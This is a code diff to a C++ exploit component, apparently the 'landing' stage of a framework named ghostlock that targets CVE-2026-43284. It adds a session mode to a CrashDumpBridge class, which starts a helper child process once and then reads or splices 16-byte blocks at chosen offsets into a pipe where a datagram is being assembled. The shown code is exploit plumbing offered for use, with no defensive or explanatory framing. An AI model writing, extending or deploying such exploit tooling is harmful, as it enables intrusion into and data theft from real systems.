@@ -33,13 +33,80 @@ namespace ghostlock::backend::cve_2026_43284::landing {
     }  // namespace
 
     bool CrashDumpBridge::bind(const char *helper_path, std::size_t helper_bytes,
-                               const char *carrier_path, std::size_t carrier_bytes) noexcept {
+                               const char *carrier_path, std::size_t carrier_bytes,
+                               int bridge_mode) noexcept {
         bound_ = take_path(helper_, sizeof(helper_), helper_path, helper_bytes) &&
                  take_path(carrier_, sizeof(carrier_), carrier_path, carrier_bytes);
         if (!bound_) {
             outcome_ = Outcome::NotBound;
+            return false;
         }
-        return bound_;
+        /* 形态在这里定下，且只有两个取值：不是 1 就是 0，装配层写错数字不会变成第三种行为。 */
+        mode_ = bridge_mode == kBridgeModeSession ? kBridgeModeSession : kBridgeModeSpawn;
+        if (mode_ == kBridgeModeSession) {
+            /* 会话把同一对路径交下去（规则与一次性桥完全相同）；子进程到第一次请求才起。 */
+            if (!session_.bind(helper_, helper_bytes, carrier_, carrier_bytes)) {
+                bound_ = false;
+                outcome_ = Outcome::NotBound;
+                return false;
+            }
+            GL_LOGI("bridge: bound helper=%s carrier=%s mode=session", helper_, carrier_);
+        }
+        return true;
+    }
+
+    bool CrashDumpBridge::session_ready() noexcept {
+        if (!session_attempted_) {
+            session_attempted_ = true;
+            session_started_ = session_.open();
+            GL_LOGI("bridge: session start=%d pid=%d mode=%d", session_started_ ? 1 : 0,
+                    static_cast<int>(session_.pid()), mode_);
+        }
+        return session_started_;
+    }
+
+    long CrashDumpBridge::session_read16(std::uint64_t offset, std::uint8_t *out) noexcept {
+        if (!session_ready()) {
+            outcome_ = Outcome::HelperFailed;
+            return -1;
+        }
+        const long got = session_.read16(offset, out);
+        if (got != static_cast<long>(kBlockBytes)) {
+            /* 一次失败就是这一块失败，之后所有块也失败（会话自己锁死，见 BridgeSession::dead）。 */
+            outcome_ = Outcome::HelperFailed;
+            last_status_ = session_.last_status();
+            GL_LOGI("bridge: session read refused offset=%llu outcome=%d requests=%zu",
+                    static_cast<unsigned long long>(offset), static_cast<int>(session_.last_outcome()),
+                    session_.requests());
+            return -1;
+        }
+        outcome_ = Outcome::Ok;
+        return got;
+    }
+
+    long CrashDumpBridge::session_splice16(int pipe_write_fd, std::uint64_t offset) noexcept {
+        if (!session_ready()) {
+            outcome_ = Outcome::HelperFailed;
+            return -1;
+        }
+        const long spliced = session_.splice16_into_pipe(offset, pipe_write_fd);
+        if (spliced != static_cast<long>(kBlockBytes)) {
+            outcome_ = Outcome::HelperFailed;
+            last_status_ = session_.last_status();
+            GL_LOGI("bridge: session splice refused offset=%llu outcome=%d requests=%zu",
+                    static_cast<unsigned long long>(offset), static_cast<int>(session_.last_outcome()),
+                    session_.requests());
+            return -1;
+        }
+        outcome_ = Outcome::Ok;
+        return spliced;
+    }
+
+    void CrashDumpBridge::close_session() noexcept {
+        /* 先关再用：此后 session_ready() 恒假，所以关闭之后不会有第二个子进程冒出来。 */
+        session_attempted_ = true;
+        session_started_ = false;
+        session_.close();
     }
 
     long CrashDumpBridge::read16(void *ctx, std::uint64_t offset,
@@ -53,6 +120,10 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         if (self == nullptr) {
             return -1;
         }
+        /* 会话形态：同一对路径，但子进程只起一次，之后每块是一次 IPC（bridge_session.hpp）。 */
+        if (self->mode_ == kBridgeModeSession) {
+            return self->session_read16(offset, out);
+        }
         /* A pipe of our own: the helper's stdout comes here and this side reads the block. */
         return self->run(offset, -1, out);
     }
@@ -65,6 +136,9 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 static_cast<unsigned long long>(offset), kBlockBytes, pipe_write_fd, ctx != nullptr ? 1 : 0);
         if (self == nullptr) {
             return -1;
+        }
+        if (self->mode_ == kBridgeModeSession) {
+            return self->session_splice16(pipe_write_fd, offset);
         }
         /* The caller's pipe is the helper's stdout: whatever the helper writes lands where the
          * datagram is being assembled, so no block travels through this process at all. */
